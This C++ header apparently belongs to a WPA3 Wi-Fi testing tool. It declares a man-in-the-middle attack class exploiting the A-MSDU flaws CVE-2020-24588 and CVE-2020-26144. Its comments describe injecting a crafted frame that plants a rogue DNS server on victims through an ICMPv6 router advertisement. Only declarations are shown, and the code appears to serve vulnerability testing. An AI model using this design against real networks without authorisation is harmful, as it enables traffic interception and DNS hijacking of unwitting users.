#pragma once
#include <tins/tins.h>
#include "attacks/mc_mitm/mc_mitm.h"
#include "config/RunStatus.h"

namespace wpa3_tester::amsdu {

class AmsduAttack : public McMitm {
public:
    // watch_inner_size > 0 -> enable CVE-2020-24588 mode
    // inner size = raw frame size minus RadioTap header length
    // compute with amsdu_server.py --print-inner-size
    size_t watch_inner_size = 0;

    // inject_eapol_amsdu -> enable CVE-2020-26144 mode (fires once after GotMitm)
    bool inject_eapol_amsdu = false;

    // IPv6 address of malicious DNS server embedded in ICMPv6 RDNSS option
    // e.g. "::ffff:192.168.1.100" for attacker's IPv4 mapped to IPv6
    std::string attacker_dns_v6 = "::1";

    // CVE-2020-24588: if set, auto-send trigger packet after GotMitm + auto-compute watch_inner_size
    std::string victim_ip    = "";
    int         trigger_count = 3;

    using McMitm::McMitm;

    void run(RunStatus &rs, int timeout_sec);
    void handle_rx_real_chan(const std::unique_ptr<Tins::PDU> &pdu, const frame_raw_t &raw);

    // called by hooks after GotMitm
    void inject_amsdu_26144();
    void send_trigger_24588();

private:
    bool cve24588_flipped_ = false;
    bool cve26144_injected_ = false;

    // --- CVE-2020-24588 helpers ---
    [[nodiscard]] bool is_trigger_frame(const frame_raw_t &raw) const;
    static void flip_amsdu_bit(frame_raw_t &raw);
    [[nodiscard]] size_t compute_watch_inner_size();
    static uint16_t ip_checksum(const uint8_t *buf, size_t len);

    // --- CVE-2020-26144 helpers ---
    // Build complete A-MSDU frame payload:
    //   subframe1: EAPOL-looking header (first 8 bytes = AA AA 03 00 00 00 88 8E)
    //   subframe2: LLC/SNAP(IPv6) + IPv6 + ICMPv6 RA + RDNSS(attacker_dns_v6)
    [[nodiscard]] std::vector<uint8_t> build_amsdu_payload() const;

    // Build ICMPv6 RA + RDNSS option bytes (without IPv6 header).
    // Checksum is computed over pseudo-header.
    static std::vector<uint8_t> build_icmpv6_ra(
        const Tins::IPv6Address &src,
        const Tins::IPv6Address &dst,
        const Tins::IPv6Address &dns);

    // Build A-MSDU subframe:  dest(6) + src(6) + length(2) + data + padding
    static std::vector<uint8_t> build_subframe(
        const Tins::HWAddress<6> &dst,
        const Tins::HWAddress<6> &src,
        const std::vector<uint8_t> &data,
        bool last);
};

}
